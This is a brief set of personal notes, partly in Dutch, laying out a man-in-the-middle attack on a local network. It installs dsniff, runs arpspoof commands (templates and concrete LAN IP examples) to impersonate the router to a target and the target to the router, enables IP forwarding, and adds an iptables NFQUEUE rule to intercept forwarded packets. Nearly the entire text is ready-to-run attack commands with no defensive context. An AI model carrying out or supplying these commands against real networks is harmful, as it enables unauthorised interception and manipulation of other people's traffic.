### Spoofing ###
- apt install dsniff
- telling to the target that i'm the router
    - arpspoof -i <interface> -t <ip-target> <ip-gateway>
    - arpspoof -i enp0s3 -t 192.168.0.254 192.168.0.1
- telling to the router that i'm the victim
    - arpspoof -i <interface> -t <ip-gateway> <ip-target>
    - arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.254
- because the attack machine is not a router, so we need to enable port-forwarding
    - echo 1 > /proc/sys/net/ipv4/ip_forward
        - /proc is een virtueel bestandssysteem waarmee je kernelinstellingen live kunt aanpassen




### Intercepting packets ###
- iptables -I FORWARD -j NFQUEUE --queue-num 0